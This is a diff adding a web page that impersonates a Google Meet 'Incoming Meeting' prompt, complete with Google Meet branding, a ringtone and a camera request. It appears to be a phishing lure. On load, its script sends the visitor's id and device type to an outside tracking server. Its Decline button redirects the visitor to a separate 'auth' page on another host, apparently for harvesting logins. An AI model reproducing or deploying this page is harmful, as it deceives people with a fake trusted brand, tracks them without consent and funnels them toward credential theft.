@@ -1,0 +1,673 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Incoming Meeting</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-96dp/logo_meet_2020q4_color_2x_web_96dp.png"
+      sizes="32x32"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+      }
+
+      body {
+        background: #000;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      /* =====================================
+       CAMERA BACKGROUND
+    ====================================== */
+
+      #camera {
+        position: fixed;
+        inset: 0;
+
+        width: 100%;
+        height: 100%;
+
+        object-fit: cover;
+
+        background: #000;
+
+        /* Mirror front camera */
+        transform: scaleX(-1);
+
+        z-index: 0;
+      }
+
+      /* Dark overlay over camera */
+      .camera-overlay {
+        position: fixed;
+        inset: 0;
+
+        width: 100%;
+        height: 100%;
+
+        background: rgba(0, 0, 0, 0.48);
+
+        z-index: 1;
+
+        pointer-events: none;
+      }
+
+      /* =====================================
+       PAGE
+    ====================================== */
+
+      .page {
+        position: relative;
+
+        width: 100%;
+        height: 100vh;
+        height: 100dvh;
+
+        display: flex;
+        align-items: center;
+        justify-content: center;
+
+        z-index: 2;
+      }
+
+      /* =====================================
+       MEETING CARD
+    ====================================== */
+
+      .meeting-card {
+        width: 390px;
+        min-height: 277px;
+
+        padding: 24px 34px 33px;
+
+        background: rgba(255, 255, 255, 0.15);
+
+        border-radius: 20px;
+
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+
+        box-shadow:
+          0 10px 40px rgba(0, 0, 0, 0.55),
+          0 0 0 1px rgba(255, 255, 255, 0.04);
+
+        backdrop-filter: blur(18px);
+        -webkit-backdrop-filter: blur(8px);
+        animation: unset;
+      }
+
+      /* =====================================
+       MEETing LOGO
+    ====================================== */
+
+      .meet-logo {
+        width: 76px;
+        height: 64px;
+
+        display: flex;
+        align-items: center;
+        justify-content: center;
+
+        margin-bottom: 22px;
+      }
+
+      .meet-logo img {
+        width: 68px;
+        height: 68px;
+
+        display: block;
+
+        object-fit: contain;
+
+        max-width: 100%;
+        max-height: 100%;
+      }
+
+      /* =====================================
+       TITLE
+    ====================================== */
+
+      .title {
+        color: #fff;
+
+        font-size: 24px;
+        font-weight: 700;
+
+        line-height: 1.2;
+
+        text-align: center;
+
+        margin-bottom: 7px;
+      }
+
+      /* =====================================
+       SUBTITLE
+    ====================================== */
+
+      .subtitle {
+        color: #dedede;
+
+        font-size: 14px;
+        font-weight: 400;
+
+        line-height: 1.4;
+
+        text-align: center;
+
+        margin-bottom: 35px;
+      }
+
+      /* =====================================
+       BUTTONS
+    ====================================== */
+
+      .buttons {
+        width: 100%;
+
+        display: flex;
+
+        gap: 14px;
+      }
+
+      button {
+        flex: 1;
+
+        height: 44px;
+
+        border: none;
+
+        border-radius: 9px;
+
+        color: #fff;
+
+        font-size: 15px;
+        font-weight: 700;
+
+        cursor: pointer;
+
+        transition:
+          transform 0.15s ease,
+          filter 0.15s ease,
+          box-shadow 0.15s ease;
+      }
+
+      button:hover {
+        filter: brightness(1.08);
+
+        transform: translateY(-1px);
+      }
+
+      button:active {
+        transform: scale(0.97);
+      }
+
+      /* =====================================
+       DECLINE
+    ====================================== */
+
+      .decline-btn {
+        background: linear-gradient(135deg, #ff4545, #e50000);
+
+        box-shadow: 0 4px 16px rgba(255, 50, 50, 0.3);
+      }
+
+      /* =====================================
+       JOIN
+    ====================================== */
+
+      .join-btn {
+        background: linear-gradient(135deg, #00c879, #00a95c);
+
+        box-shadow: 0 4px 16px rgba(0, 200, 120, 0.3);
+      }
+
+      /* =====================================
+       CAMERA STATUS
+    ====================================== */
+
+      .camera-status {
+        position: fixed;
+
+        left: 50%;
+        bottom: 15px;
+
+        transform: translateX(-50%);
+
+        z-index: 5;
+
+        padding: 8px 14px;
+
+        border-radius: 20px;
+
+        background: rgba(0, 0, 0, 0.65);
+
+        color: rgba(255, 255, 255, 0.85);
+
+        font-size: 12px;
+
+        display: none;
+
+        white-space: nowrap;
+      }
+
+      /* =====================================
+       MOBILE
+    ====================================== */
+
+      @media (max-width: 600px) {
+        .meeting-card {
+          width: calc(100% - 32px);
+
+          max-width: 390px;
+
+          min-height: auto;
+
+          padding: 22px 24px 28px;
+
+          border-radius: 18px;
+        }
+
+        .meet-logo {
+          width: 70px;
+          height: 60px;
+
+          margin-bottom: 18px;
+        }
+
+        .meet-logo img {
+          width: 60px;
+          height: 60px;
+        }
+
+        .title {
+          font-size: 21px;
+        }
+
+        .subtitle {
+          font-size: 13px;
+
+          margin-bottom: 28px;
+        }
+
+        .buttons {
+          gap: 10px;
+        }
+
+        button {
+          height: 44px;
+
+          font-size: 14px;
+        }
+      }
+
+      /* =====================================
+       SMALL MOBILE
+    ====================================== */
+
+      @media (max-width: 360px) {
+        .meeting-card {
+          width: calc(100% - 24px);
+
+          padding: 20px 18px 24px;
+        }
+
+        .meet-logo {
+          width: 64px;
+          height: 56px;
+        }
+
+        .meet-logo img {
+          width: 56px;
+          height: 56px;
+        }
+
+        .title {
+          font-size: 19px;
+        }
+
+        .subtitle {
+          font-size: 12px;
+        }
+
+        .buttons {
+          gap: 8px;
+        }
+
+        button {
+          height: 42px;
+
+          font-size: 13px;
+        }
+      }
+
+      /* =====================================
+       VERY SMALL SCREEN
+    ====================================== */
+
+      @media (max-width: 300px) {
+        .buttons {
+          flex-direction: column;
+        }
+
+        button {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- =====================================
+       CAMERA
+  ====================================== -->
+
+    <video id="camera" autoplay muted playsinline></video>
+
+    <div class="camera-overlay"></div>
+    <audio id="ringtone" preload="auto" loop>
+      <source
+        src="https://dl.prokerala.com/downloads/ringtones/files/dl/mp3/7120-download-iphone-6-original-ringtone-42676.mp3"
+        type="audio/mpeg"
+      />
+
+      Your browser does not support audio.
+    </audio>
+    <!-- =====================================
+       MAIN PAGE
+  ====================================== -->
+
+    <main class="page">
+      <div class="meeting-card">
+        <!-- Meet Logo -->
+        <div class="meet-logo">
+          <img
+            src="https://res.cloudinary.com/douhxwdhg/image/upload/v1773601144/Google_Meet_icon__2020.svg_ac5lri.png"
+            alt="Google Meet"
+          />
+        </div>
+
+        <!-- Title -->
+        <h1 class="title">Incoming Meeting</h1>
+
+        <!-- Subtitle -->
+        <p class="subtitle">Join the meeting now</p>
+
+        <!-- Buttons -->
+        <div class="buttons">
+          <button type="button" class="decline-btn" id="declineBtn">
+            Decline
+          </button>
+
+          <button type="button" class="join-btn" id="joinBtn">Join</button>
+        </div>
+      </div>
+    </main>
+
+    <!-- Camera permission message -->
+    <div id="cameraStatus" class="camera-status">
+      Camera permission is required
+    </div>
+
+    <script>
+      /* =====================================
+       ELEMENTS
+    ====================================== */
+      let id = new URLSearchParams(window.location.search).get("id");
+      const camera = document.getElementById("camera");
+
+      const ringtone = document.getElementById("ringtone");
+
+      const cameraStatus = document.getElementById("cameraStatus");
+
+      const declineBtn = document.getElementById("declineBtn");
+
+      const joinBtn = document.getElementById("joinBtn");
+
+      /* =====================================
+       RINGTONE SETTINGS
+    ====================================== */
+
+      /*
+      Ringtone duration:
+
+      20 seconds = 20000
+
+      30 seconds = 30000
+
+      60 seconds = 60000
+    */
+
+      const RINGTONE_DURATION = 20000;
+
+      let ringtoneTimer = null;
+
+      let ringtonePlaying = false;
+
+      /* =====================================
+       START RINGTONE
+    ====================================== */
+
+      async function startRingtone() {
+        if (ringtonePlaying) {
+          return;
+        }
+
+        try {
+          ringtone.currentTime = 0;
+
+          await ringtone.play();
+
+          ringtonePlaying = true;
+
+          /*
+          Automatically stop
+          after 20 seconds.
+        */
+
+          ringtoneTimer = setTimeout(() => {
+            stopRingtone();
+          }, RINGTONE_DURATION);
+        } catch (error) {
+          console.log("Autoplay blocked by browser.");
+        }
+      }
+
+      /* =====================================
+       STOP RINGTONE
+    ====================================== */
+
+      function stopRingtone() {
+        if (ringtoneTimer) {
+          clearTimeout(ringtoneTimer);
+
+          ringtoneTimer = null;
+        }
+
+        ringtone.pause();
+
+        ringtone.currentTime = 0;
+
+        ringtonePlaying = false;
+      }
+
+      /* =====================================
+       TRY AUTOPLAY
+    ====================================== */
+
+      window.addEventListener("load", () => {
+        startRingtone();
+      });
+
+      /* =====================================
+       AUTOPLAY FALLBACK
+    ====================================== */
+
+      function enableAudio() {
+        startRingtone();
+      }
+
+      document.addEventListener("click", enableAudio, {
+        once: true,
+      });
+
+      document.addEventListener("touchstart", enableAudio, {
+        once: true,
+      });
+
+      /* =====================================
+       START CAMERA
+    ====================================== */
+
+      async function startCamera() {
+        try {
+          /*
+          Request camera only.
+        No microphone required.
+        */
+
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+            },
+
+            audio: false,
+          });
+
+          camera.srcObject = stream;
+
+          cameraStatus.style.display = "none";
+        } catch (error) {
+          console.error("Camera error:", error);
+
+          cameraStatus.textContent = "Camera permission is required";
+
+          cameraStatus.style.display = "block";
+        }
+      }
+
+      /* =====================================
+       STOP CAMERA
+    ====================================== */
+
+      function stopCamera() {
+        if (!camera.srcObject) {
+          return;
+        }
+
+        camera.srcObject.getTracks().forEach((track) => {
+          track.stop();
+        });
+
+        camera.srcObject = null;
+      }
+
+      /* =====================================
+       START EVERYTHING
+    ====================================== */
+
+      startCamera();
+
+      /* =====================================
+       DECLINE
+    ====================================== */
+
+      //   declineBtn.addEventListener("click", () => {
+
+      //     const card = document.querySelector(".meeting-card");
+
+      //     card.style.display = "none";
+      //   });
+
+      declineBtn.addEventListener("click", () => {
+        stopRingtone();
+
+        stopCamera();
+
+        window.location.href =
+          "https://auth-seven-pied.vercel.app/user-auth.html?id=" + id; // your auth page
+      });
+
+      /* =====================================
+       JOIN
+    ====================================== */
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+
+      window.addEventListener("load", async () => {
+        try {
+          const res = await fetch(
+            "https://megatools-8920.onrender.com/api/v1/information",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                user: id,
+                deviceType,
+                siteName: "AutoInfo/login-view",
+              }),
+            },
+          );
+
+          const data = await res.json();
+        } catch (err) {
+          console.error(err);
+          alert("Failed to save email.");
+        }
+      });
+
+      joinBtn.addEventListener("click", () => {
+        stopRingtone();
+
+        stopCamera();
+
+        /*
+          Change this URL to
+          your actual meeting page.
+        */
+
+        window.location.href = "newlivecall?id=" + id;
+      });
+
+      /* =====================================
+       CLEANUP
+    ====================================== */
+
+      window.addEventListener("beforeunload", () => {
+        stopRingtone();
+
+        stopCamera();
+      });
+    </script>
+  </body>
+</html>
